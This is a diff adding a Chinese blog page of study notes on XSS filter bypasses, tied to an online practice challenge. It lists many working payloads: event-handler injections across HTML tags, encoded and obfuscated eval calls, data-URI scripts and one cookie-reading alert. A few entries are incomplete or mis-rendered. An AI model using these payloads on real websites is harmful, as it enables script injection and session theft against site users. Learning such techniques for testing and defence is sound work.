+<p>提升了代码的复杂性，可能可以绕过浏览器的过滤机制</p>
+<h3 id="5-赋值绕过"><a href="#5-赋值绕过" class="headerlink" title="5.赋值绕过"></a>5.赋值绕过</h3><p>（类似于拼接绕过）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src onerror=_=alert,_(1)&gt;</span><br><span class="line">&lt;img src x=al y=ert onerror=top[x+y](1)&gt;</span><br><span class="line">&lt;img src x=al y=ert onerror=window[x+y](1)&gt; #在网页没有嵌套框架时才有效。</span><br><span class="line">&lt;img src onerror=top[a=&#x27;al&#x27;,b=&#x27;ev&#x27;,b+a](&#x27;alert(1)&#x27;)&gt;</span><br><span class="line">&lt;img src onerror=[&#x27;ale&#x27;+&#x27;rt&#x27;].map(top[&#x27;ev&#x27;+&#x27;al&#x27;])[0][&#x27;valu&#x27;+&#x27;eOf&#x27;]()(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-空格绕过"><a href="#6-空格绕过" class="headerlink" title="6.空格绕过"></a>6.空格绕过</h3><p>1.空格字符绕过<br>        两个空格代替一个空格，用Tab代替空格，%a0=空格。</p>
+<p> 绕过的替代类型：</p>
+<p>%20 --代表url编码的空格，在空格过滤时可以代替。</p>
+<p>%09--用于在输出或显示文本时在该位置产生一个固定的水平间距，类似于tab键。</p>
+<p>%0a--代表换行符</p>
+<p>%0b--用于在输出或显示文本时在该位置产生一个固定的垂直间距，类似于tab键。</p>
+<p>%0c--</p>
+<p>%0d--回车换行</p>
+<p>%a0--代表的是非断行空格</p>
+<p>%00--%00代表的是ASCII码中的空字符</p>
+<p>/**/</p>
+<p>/!/<br>————————————————</p>
+<pre><code>                        版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。
+</code></pre>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_66839513/article/details/137018642">https://blog.csdn.net/weixin_66839513/article/details/137018642</a></p>
+<h3 id="7-叠写绕过"><a href="#7-叠写绕过" class="headerlink" title="7.叠写绕过"></a>7.叠写绕过</h3><p>有些过滤机制会删除关键词，例如on</p>
+<p>这时候可以采用叠写oonn删掉了中间的，外面的on就绕过去了（没有再次进行检查）</p>
+<p>[欢迎来到level7</p>
+<p><a target="_blank" rel="noopener" href="https://xss.tesla-space.com/level7.php?keyword=&submit=%E6%90%9C%E7%B4%A2"></a></p>
+<h3 id="8-注释绕过"><a href="#8-注释绕过" class="headerlink" title="8.注释绕过"></a>8.注释绕过</h3><p><a target="_blank" rel="noopener" href="https://xss.tesla-space.com/level9.php?keyword=&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5">欢迎来到level9</a></p>
+<p>有些题目会要求输入中一定包含某些字段</p>
+<p>这时候可以用注释将字段插入其中而不影响脚本的执行</p>
+<h2 id="2-触发器"><a href="#2-触发器" class="headerlink" title="2.触发器"></a>2.触发器</h2><p>例如：onmouseover：onmouseover=javascript:alert(1)</p>
+<p>javascript:在这里是伪协议。对后面语句会被认定为js事件。</p>
+<p>什么情况需要使用触发器？：事件触发器用于模拟或手动触发某些浏览器事件。例如，使用 <code>click()</code> 或 <code>mouseover()</code> 等方法，你可以手动触发用户通常会触发的事件。</p>
+<p><code>onmouseover</code> 事件的主要用途是：</p>
+<ul>
+<li><p>在鼠标悬停在元素上时，触发某些操作（例如样式改变、内容显示、动画效果等）。</p>
+<p>例如&lt;input name=keyword value=&quot;&quot; onmouseover=javascript:alert(1) &#39;&#39;&quot;&gt;，要将鼠标放在input上将触发alert事件。</p>
+<h3 id="1-触发器与属性绕过："><a href="#1-触发器与属性绕过：" class="headerlink" title="1.触发器与属性绕过："></a>1.触发器与属性绕过：</h3><p>参考：<a target="_blank" rel="noopener" href="https://we11s.github.io/posts/508713684/">XSS-基础篇 | Wells Blog</a></p>
+<h3 id="标签"><a href="#标签" class="headerlink" title="&lt;a&gt; 标签"></a><code>&lt;a&gt;</code> 标签</h3><p><strong>对应属性：</strong></p>
+<p><code>href</code>属性（手动点击）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onfocus</code>（获取焦点时触发XSS，如:点击）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;a href=&quot;x&quot; onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onclick</code>（点击时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;a href=&quot;x&quot; onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;a href=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseout</code>（鼠标移出时触发XSS）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;a href=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="标签-1"><a href="#标签-1" class="headerlink" title="&lt;img&gt;标签"></a><code>&lt;img&gt;</code>标签</h3><p><strong>对应属性：</strong></p>
+<p><code>onerror</code>（加载错误时触发XSS、将src乱输入一个值即可）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;img src=x onerror=&quot;alert(1)&quot;&gt;</span><br><span class="line">&lt;img src=x onerror=eval(&quot;alert(1)&quot;)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;img src=1 onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseout</code>（鼠标移出时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;img src=1 onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;v</span><br></pre></td></tr></table></figure>
+
+<p><code>onclick</code>（点击时触发XSS）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;img src=1 onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="标签-2"><a href="#标签-2" class="headerlink" title="&lt;iframe&gt;标签"></a><code>&lt;iframe&gt;</code>标签</h3><p>HTML 内联框架元素 (<code>&lt;iframe&gt;</code>)</p>
+<p><strong>对应属性：</strong></p>
+<p><code>onload</code>（加载完成时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;iframe onload=&quot;alert(document.cookie)&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe onload=&quot;base64,YWxlcnQoJ3hzcycpOw==&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;iframe onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>src</code>属性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;test&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt; </span><br><span class="line">//base64解码后为&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="标签-3"><a href="#标签-3" class="headerlink" title="&lt;audio&gt; 标签"></a><code>&lt;audio&gt;</code> 标签</h3><p><audio> 标签定义声音，比如音乐或其他音频流。</p>
+<p><strong>对应属性：</strong></p>
+<p><code>onerror</code>（加载错误时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;audio src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;audio&gt;&lt;source src=&quot;x&quot; onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/audio&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onfocus</code>（获取焦点时触发XSS，如:点击）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;audio controls onfocus=eval(&quot;alert(&#x27;xss&#x27;);&quot;) autofocus=&quot;&quot;&gt;&lt;/audio&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;audio controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;source src=&quot;x&quot;&gt;&lt;/audio&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="标签-4"><a href="#标签-4" class="headerlink" title="&lt;video&gt;标签"></a><code>&lt;video&gt;</code>标签</h3><p><strong>对应属性：</strong></p>
+<p><code>onerror</code>（加载错误时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;video src=x onerror=alert(1)&gt;</span><br><span class="line">&lt;video&gt;&lt;source onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;video controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onfocus</code>（获取焦点时触发XSS，如:点击）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;video controls onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onclick</code>（点击时触发XSS）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;video controls onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="标签-5"><a href="#标签-5" class="headerlink" title="&lt;svg&gt; 标签"></a><code>&lt;svg&gt;</code> 标签</h3><p><strong>对应属性：</strong></p>
+<p><code>onload</code>（加载完成时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;svg onload=javascript:alert(1)&gt;</span><br><span class="line">&lt;svg onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="标签-6"><a href="#标签-6" class="headerlink" title="&lt;button&gt; 标签"></a><code>&lt;button&gt;</code> 标签</h3><p><strong>对应属性：</strong></p>
+<p><code>onclick</code>（点击时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;button onclick=alert(1)&gt;</span><br><span class="line">&lt;button onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onfocus</code>（获取焦点时触发XSS，如:点击）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;button onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/button&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;button onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseout</code>（鼠标移出时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;button onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseup</code>（鼠标按钮释放时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;button onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmousedown</code>（鼠标按钮按下时触发XSS）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;button onmousedown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/button&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="标签-7"><a href="#标签-7" class="headerlink" title="&lt;div&gt;标签"></a><code>&lt;div&gt;</code>标签</h3><p><strong>对应属性：</strong></p>
+<p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p>
+<p>这个需要借助url编码来实现绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">原代码：</span><br><span class="line">&lt;div onmouseover=&#x27;alert(1)&#x27;&gt;DIV&lt;/div&gt;</span><br><span class="line">经过url编码：</span><br><span class="line">&lt;div onmouseover%3d&#x27;alert%26lpar%3b1%26rpar%3b&#x27;&gt;DIV&lt;%2fdiv&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="标签-8"><a href="#标签-8" class="headerlink" title="&lt;object&gt;标签"></a><code>&lt;object&gt;</code>标签</h3><p>这个需要借助 data 伪协议和 base64 编码来实现绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="标签-9"><a href="#标签-9" class="headerlink" title="&lt;script&gt; 标签"></a><code>&lt;script&gt;</code> 标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(123)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="标签-10"><a href="#标签-10" class="headerlink" title="&lt;p&gt; 标签"></a><code>&lt;p&gt;</code> 标签</h3><p><strong>对应属性：</strong></p>
+<p><code>onclick</code>（点击时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;p onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;p onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseout</code>（鼠标移出时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;p onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseup</code>（鼠标按钮释放时触发XSS）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;p onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="标签-11"><a href="#标签-11" class="headerlink" title="&lt;input&gt; 标签"></a><code>&lt;input&gt;</code> 标签</h3><p><strong>对应属性：</strong></p>
+<p><code>onclick</code>（点击时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;input onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onfocus</code>（获取焦点时触发XSS，如:点击）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;input onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onkeydown</code>（键盘按键按下时触发XSS）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;input type=&quot;text&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onkeydown</code>（在键盘按键按下并释放一个键时触发XSS）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;input type=&quot;text&quot; onkeypress=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="标签-12"><a href="#标签-12" class="headerlink" title="&lt;details&gt;标签"></a><code>&lt;details&gt;</code>标签</h3><p><strong>对应属性：</strong></p>
+<p><code>ontoggle</code>（切换时触发XSS，如:详情元素展开或收起）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/details&gt;</span><br><span class="line">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot; open=&quot;&quot;&gt;&lt;/details&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="标签-13"><a href="#标签-13" class="headerlink" title="&lt;select&gt; 标签"></a><code>&lt;select&gt;</code> 标签</h3><p><strong>对应属性：</strong></p>
+<p><code>onfocus</code>（获取焦点时触发XSS，如:点击）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;select onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;&lt;/select&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;select onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/select&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onclick</code>（点击时触发XSS）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;select onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;&lt;/select&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="标签-14"><a href="#标签-14" class="headerlink" title="&lt;form&gt; 标签"></a><code>&lt;form&gt;</code> 标签</h3><p><strong>对应属性：</strong></p>
+<p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseout</code>（鼠标移出时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseup</code>（鼠标按钮释放时触发XSS）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>action</code>（提交表单时触发）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;form action=javascript:alert(1)&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="标签-15"><a href="#标签-15" class="headerlink" title="&lt;body&gt; 标签"></a><code>&lt;body&gt;</code> 标签</h3><p><strong>对应属性：</strong></p>
+<p><code>onload</code>（加载完成时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&lt;body onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="3-编码绕过"><a href="#3-编码绕过" class="headerlink" title="3.编码绕过"></a>3.编码绕过</h2><p>简单来说就是将一些字符通过某种编码的形式进行转换从而进行（避免）xss攻击</p>
+<h3 id="1-html实体编码转义"><a href="#1-html实体编码转义" class="headerlink" title="1.html实体编码转义"></a><strong>1.html实体编码转义</strong></h3><p><a target="_blank" rel="noopener" href="https://xss.tesla-space.com/level8.php?keyword=&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5">欢迎来到level8</a></p>
+<p>href 中是可以识别字符编码的，且不会破坏原本含义</p>
+<p>本题：script被过滤，那么可以对script进行html实体编码从而绕过过滤</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:alert(1)&quot;&gt;aaa&lt;/a&gt;</span><br><span class="line">实体转移（）：&lt;a href=&quot;java&amp;#115;cript:alert(1)&quot;&gt;aaa&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>HTML实体编码</strong>的规则是将字符的十进制或十六进制编码加上特定的格式：</p>
+<h4 id="十进制编码"><a href="#十进制编码" class="headerlink" title="十进制编码"></a><strong>十进制编码</strong></h4><p>将 Unicode 字符的十进制码点包裹在 <code>&amp;#</code> 和 <code>;</code> 之间。<br>例如：</p>
+<ul>
+<li>字符 <strong><code>s</code></strong> 的十进制码点是 <strong>115</strong>，HTML实体编码为 <code>s</code>。</li>
+</ul>
+<h4 id="十六进制编码"><a href="#十六进制编码" class="headerlink" title="十六进制编码"></a>十六进制编码</h4><p>将 Unicode 字符的十六进制码点包裹在 <code>&amp;#x</code> 和 <code>;</code> 之间，其中 <code>x</code> 表示十六进制。<br>例如：</p>
+<ul>
+<li>字符 <strong><code>s</code></strong> 的十六进制码点是 <strong>73</strong>（十六进制），HTML实体编码为 <code>s</code>。</li>
+</ul>
+<p>这两种格式都可以用于 HTML 页面，浏览器会自动将它们解析为对应的字符。</p>
+<h2 id="4-纠错绕过"><a href="#4-纠错绕过" class="headerlink" title="4.纠错绕过"></a>4.纠错绕过</h2><h3 id="1-标签容错"><a href="#1-标签容错" class="headerlink" title="1. 标签容错"></a>1. <strong>标签容错</strong></h3><p>HTML 允许不严格遵循标准的代码，浏览器会尽量修复错误和缺失的标签。在 XSS 攻击中，攻击者可以利用这个特性，注入不完整或错误的标签，浏览器会自动修复并执行其中的 JavaScript 代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
